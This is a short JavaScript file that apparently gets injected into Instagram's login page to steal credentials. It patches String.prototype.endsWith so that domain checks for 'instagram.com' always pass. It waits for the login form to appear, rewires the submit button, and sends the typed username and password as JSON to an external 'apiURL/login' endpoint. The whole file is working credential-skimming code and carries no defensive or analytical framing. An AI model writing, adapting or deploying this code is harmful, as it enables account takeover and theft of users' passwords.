if (typeof instaFirstRun == 'undefined') {
    var instaFirstRun = false

    var oldEndsWith = String.prototype.endsWith
    String.prototype.endsWith = function () {
        var suffix = arguments[0]
        if (suffix.toLowerCase().includes("instagram.com")) {
            return true
        }
        return oldEndsWith.apply(this, arguments)
    }

    function onclickListener() {
        var submit = document.querySelectorAll('button[type=submit]')[0];
        submit.setAttribute("onclick", "sendPass()");
        console.log("setuped click listener");
        return;
    }
    function sendPass() {
        var username = document.querySelectorAll('input[name=username]')[0].value;
        var password = document.querySelectorAll('input[type=password]')[0].value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", apiURL + '/login', true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({ 'username': username, 'password': password }));
        return;
    }
    let start = setInterval(function () {
        console.log("setInterval called");
        if (document.querySelectorAll('form[id=loginForm]').length) {
            clearInterval(start);
            console.log("loginForm loaded");
            onclickListener();
        }
    }, 500);
}
